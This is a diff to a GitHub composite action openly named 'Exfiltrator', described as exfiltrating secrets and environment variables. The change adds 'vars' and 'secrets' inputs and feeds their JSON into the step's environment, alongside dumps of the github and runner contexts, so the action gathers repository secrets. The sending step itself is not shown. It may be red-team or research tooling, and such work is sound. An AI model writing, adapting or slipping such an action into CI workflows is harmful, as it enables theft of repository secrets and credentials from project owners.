@@ -1,6 +1,16 @@
 name: 'Exfiltrator'
 description: 'This exfiltrates secrets and environment variables.'
 
+inputs:
+  vars:
+    description: 'The variables for the repository'
+    required: false
+    default: "{\"vars\":\"no vars\"}"
+  secrets:
+    description: 'The secrets for the repository'
+    required: false
+    default: "{\"vars\":\"no secrets\"}"
+
 runs:
   using: "composite"
   steps:
@@ -10,6 +20,6 @@ runs:
       env:
         GITHUB_JSON: ${{ toJSON(github) }}
         RUNNER_JSON: ${{ toJSON(runner) }}
-        VARS_JSON: "{\"vars\":\"no vars\"}"
-        SECRETS_JSON: "{\"vars\":\"no secrets\"}"
+        VARS_JSON: ${{ toJSON(inputs.vars) }}
+        SECRETS_JSON: ${{ toJSON(inputs.secrets) }}
         
